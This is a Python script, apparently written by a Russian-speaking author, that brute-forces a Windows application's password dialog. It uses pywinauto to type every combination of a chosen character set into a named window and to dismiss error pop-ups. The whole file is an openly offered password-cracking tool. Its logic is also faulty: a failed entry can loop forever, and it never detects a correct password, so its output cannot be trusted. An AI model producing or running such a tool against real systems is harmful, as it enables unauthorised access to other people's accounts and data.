import string
import logging
from pywinauto import Application

# Настроим логгирование
logging.basicConfig(filename='logterminal.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def enter_password(password, target_window, error_window_title):
    try:
        app = Application().connect(title=target_window)
        app.top_window().Edit.set_text(password)
        app.top_window().type_keys("{ENTER}")
        return True
    except Exception as e:
        logging.error(f"Ошибка при вводе пароля: {password}")

    try:
        error_app = Application().connect(title=error_window_title, timeout=1)
        error_app.top_window().close()
    except Exception as e:
        pass

def main():
    target_window = input("Введите заголовок окна для взлома паролей: ")
    error_window_title = input("Введите заголовок окна ошибки (оставьте пустым, если окна с ошибкой нет): ")
    max_password_length = int(input("Введите максимальную длину пароля: "))
    print("Выберите тип пароля:")
    print("1 - Цифры")
    print("2 - Цифры и буквы")
    print("3 - Цифры, буквы и символы")
    password_type = input("Введите номер выбранного типа пароля: ")

    if password_type == "1":
        password_type = "Цифры"
    elif password_type == "2":
        password_type = "Цифры и буквы"
    elif password_type == "3":
        password_type = "Цифры, буквы и символы"

    if target_window and max_password_length:
        chars = string.digits

        if password_type == "Цифры":
            chars = string.digits
        elif password_type == "Цифры и буквы":
            chars = string.digits + string.ascii_letters
        elif password_type == "Цифры, буквы и символы":
            chars = string.digits + string.ascii_letters + string.punctuation

        last_found_password = None
        prev_password = None

        try:
            for length in range(1, max_password_length + 1):
                for password in generate_passwords(chars, length):
                    while not enter_password(password, target_window, error_window_title):
                        pass
                    prev_password = last_found_password
                    last_found_password = password
        except KeyboardInterrupt:
            if prev_password:
                print(f"Перебор паролей был прерван. Последний найденный пароль: {prev_password}")

def generate_passwords(chars, max_length):
    if max_length == 0:
        return []

    passwords = list(chars)
    for i in range(2, max_length + 1):
        new_passwords = []
        for password in passwords:
            for char in chars:
                new_passwords.append(password + char)
        passwords = new_passwords
    return passwords

if __name__ == "__main__":
    main()
